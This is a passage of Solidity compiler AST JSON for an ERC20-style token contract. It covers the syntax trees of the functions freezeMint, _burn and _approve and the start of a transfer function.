																"referencedDeclaration": 19,
																"src": "2016:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 145,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2248,
															"src": "2016:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 147,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2016:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2002:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 149,
												"nodeType": "ExpressionStatement",
												"src": "2002:37:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 150,
															"name": "_frozenBalance",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 33,
															"src": "2049:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 152,
														"indexExpression": {
															"argumentTypes": null,
															"id": 151,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "2064:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2049:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 157,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 129,
																"src": "2103:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 153,
																	"name": "_frozenBalance",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 33,
																	"src": "2075:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 155,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 154,
																	"name": "account",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 127,
																	"src": "2090:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2075:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 156,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2248,
															"src": "2075:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 158,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2075:35:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2049:61:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 160,
												"nodeType": "ExpressionStatement",
												"src": "2049:61:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 163,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2142:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 162,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2134:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 164,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2134:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 165,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 127,
															"src": "2146:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 166,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 129,
															"src": "2155:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 161,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2125:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2125:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 168,
												"nodeType": "EmitStatement",
												"src": "2120:42:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 169,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2179:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 133,
												"id": 170,
												"nodeType": "Return",
												"src": "2172:11:0"
											}
										]
									},
									"documentation": null,
									"id": 172,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "freezeMint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 130,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 127,
												"name": "account",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1743:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 126,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1743:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 129,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1768:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 128,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1768:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1733:55:0"
									},
									"returnParameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 132,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 172,
												"src": "1807:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 131,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1807:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1806:6:0"
									},
									"scope": 435,
									"src": "1714:476:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 205,
										"nodeType": "Block",
										"src": "2249:155:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 188,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 179,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2259:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 181,
														"indexExpression": {
															"argumentTypes": null,
															"id": 180,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 174,
															"src": "2269:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2259:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 186,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 176,
																"src": "2297:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 182,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2277:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 184,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 183,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 174,
																	"src": "2287:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2277:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 185,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2270,
															"src": "2277:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 187,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2277:26:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2259:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 189,
												"nodeType": "ExpressionStatement",
												"src": "2259:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 195,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 190,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "2313:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 193,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 176,
																"src": "2343:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 191,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "2327:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 192,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2270,
															"src": "2327:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 194,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2327:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2313:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 196,
												"nodeType": "ExpressionStatement",
												"src": "2313:36:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 198,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 174,
															"src": "2373:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 200,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2387:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 199,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2379:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 201,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2379:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 202,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 176,
															"src": "2391:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 197,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2364:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 203,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2364:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 204,
												"nodeType": "EmitStatement",
												"src": "2359:38:0"
											}
										]
									},
									"documentation": null,
									"id": 206,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 177,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 174,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 206,
												"src": "2211:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 173,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2211:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 176,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 206,
												"src": "2225:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 175,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2225:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2210:29:0"
									},
									"returnParameters": {
										"id": 178,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2249:0:0"
									},
									"scope": 435,
									"src": "2196:208:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 229,
										"nodeType": "Block",
										"src": "2483:96:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 221,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 215,
																"name": "allowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 29,
																"src": "2493:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 218,
															"indexExpression": {
																"argumentTypes": null,
																"id": 216,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 208,
																"src": "2503:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "2493:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 219,
														"indexExpression": {
															"argumentTypes": null,
															"id": 217,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "2510:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2493:25:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 220,
														"name": "value",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 212,
														"src": "2521:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2493:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 222,
												"nodeType": "ExpressionStatement",
												"src": "2493:33:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 224,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 208,
															"src": "2550:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 225,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "2557:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 226,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 212,
															"src": "2566:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 223,
														"name": "Approval",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															50
														],
														"referencedDeclaration": 50,
														"src": "2541:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 227,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2541:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 228,
												"nodeType": "EmitStatement",
												"src": "2536:36:0"
											}
										]
									},
									"documentation": null,
									"id": 230,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 213,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 208,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2428:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 207,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2428:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 210,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2443:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 209,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2443:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 212,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2460:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 211,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2460:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2427:47:0"
									},
									"returnParameters": {
										"id": 214,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2483:0:0"
									},
									"scope": 435,
									"src": "2410:169:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 267,
										"nodeType": "Block",
										"src": "2653:151:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 248,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 239,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2663:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 241,
														"indexExpression": {
															"argumentTypes": null,
															"id": 240,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "2673:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2663:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 246,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 236,
																"src": "2701:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 242,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2681:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 244,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 243,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 232,
																	"src": "2691:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2681:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 245,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2270,
															"src": "2681:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 247,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2681:26:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2663:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 249,
												"nodeType": "ExpressionStatement",
												"src": "2663:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 259,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 250,
															"name": "balanceOf",
